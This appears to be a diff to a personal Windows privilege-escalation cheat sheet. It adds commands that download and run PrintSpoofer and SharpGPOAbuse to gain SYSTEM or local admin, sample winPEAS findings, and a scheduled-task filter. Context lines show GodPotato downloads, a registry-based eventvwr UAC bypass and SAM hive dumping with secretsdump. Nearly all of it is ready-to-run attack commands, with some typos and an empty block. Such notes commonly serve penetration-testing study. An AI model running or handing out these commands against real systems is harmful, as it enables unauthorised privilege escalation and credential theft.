@@ -16,7 +16,7 @@ impacket-psexec "domain/user:pass"@x.x.x.x
 ### godpotato
 shuould use all version
 ```
-mkdir ~/godpotato; cd ~/godpotato; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+mkdir .//godpotato; cd ./godpotato; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe; wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
 ```
 
 download
@@ -49,6 +49,17 @@ Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name
 Start-Process eventvwr.exe
 ```
 
+### printspoofer
+download
+```
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+```
+
+usage
+```
+.\PrintSpoofer.exe -i -c cmd
+```
 ## Windows Services
 ### Service Binary Hijacking
 List of services with binary path
@@ -117,9 +128,22 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /i /v "C:\Windows"
 ```
 
+check winPEASx64.exe (example)
+```
+================================================================================== 
+    MySQL(MySQL)[C:\xampp\mysql\bin\mysqld.exe MySQL] - Autoload - No quotes and Space detected
+    File Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
+    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Authenticated Users [Allow: WriteData/CreateFiles])
+================================================================================== 
+```
 ### check the binary folder
 ```
 ls binaryfolder
+```
+
+check prcomon
+```
+
 ```
 
 standard DLL search order
@@ -249,6 +273,11 @@ get list of all scheduled tasks
 schtasks /query /fo LIST /v
 ```
 
+filtering 
+```
+chtasks /query /fo LIST /v | findstr /C:"Task To Run:" | findstr /V /I "system32 COM handler"
+```
+
 or
 ```
 get-scheduledtask | where-object { $_.Author -and $_.Author -notmatch "Microsoft" -and $_.Author -ne "N/A" } | format-table taskname, taskpath, author, state
@@ -284,4 +313,23 @@ reg save HKLM\security security
 extract the hash
 ```
 impacket-secretsdump -sam sam -security security -system system LOCAL
+```
+
+# Abuse GPO
+ check for the permissions our current user have over the GPONAME
+```
+import-module .\PowerView.ps1
+Get-NetGPO | select displayname
+Get-GPO -Name "GPONAME"
+Get-GPPermission -Guid ID -TargetType User -TargetName USERNAME
+```
+
+download sharpAbuseGPO.exe
+```
+wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
+```
+
+add localadmin
+```
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount CURRENT_USER --GPOName "GPONAME"
 ```
